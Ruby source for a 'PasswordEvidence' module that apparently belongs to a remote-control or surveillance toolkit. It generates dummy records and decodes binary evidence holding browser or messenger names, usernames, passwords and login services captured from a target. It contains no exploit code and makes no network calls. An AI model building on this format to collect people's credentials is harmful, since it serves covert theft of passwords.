require 'rcs-common/evidence/common'

module RCS

module PasswordEvidence

  ELEM_DELIMITER = 0xABADC0DE

  def content
    resource = ["MSN\0", "IExplorer\0", "Firefox\0"].sample.to_utf16le_binary
    service = ["http://login.live.com\0", "http://www.google.com\0", "http://msn.live.it\0"].sample.to_utf16le_binary
    user = "ALoR\0".to_utf16le_binary
    pass = "secret\0".to_utf16le_binary
    content = StringIO.new
    t = Time.now.getutc
    content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
    content.write resource
    content.write user
    content.write pass
    content.write service
    content.write [ ELEM_DELIMITER ].pack('L*')

    content.string
  end
  
  def generate_content
    ret = Array.new
    (rand(10)).times { ret << content() }
    ret
  end
  
  def decode_content
    stream = StringIO.new @info[:chunks].join

    evidences = Array.new
    until stream.eof?
      tm = stream.read 36
      @info[:acquired] = Time.gm(*tm.unpack('l*'), 0)
      @info[:resource] = ''
      @info[:service] = ''
      @info[:user] = ''
      @info[:pass] = ''

      resource = stream.read_utf16le_string
      @info[:resource] = resource.utf16le_to_utf8 unless resource.nil?
      user = stream.read_utf16le_string
      @info[:user] = user.utf16le_to_utf8 unless user.nil?
      pass = stream.read_utf16le_string
      @info[:pass] = pass.utf16le_to_utf8 unless pass.nil?
      service = stream.read_utf16le_string
      @info[:service] = service.utf16le_to_utf8 unless service.nil?

      delim = stream.read(4).unpack("L*").first
      raise EvidenceDeserializeError.new("Malformed evidence (missing delimiter)") unless delim == ELEM_DELIMITER

      # this is not the real clone! redefined clone ...
      evidences << self.clone
    end
    
    return evidences
  end
end

end # ::RCS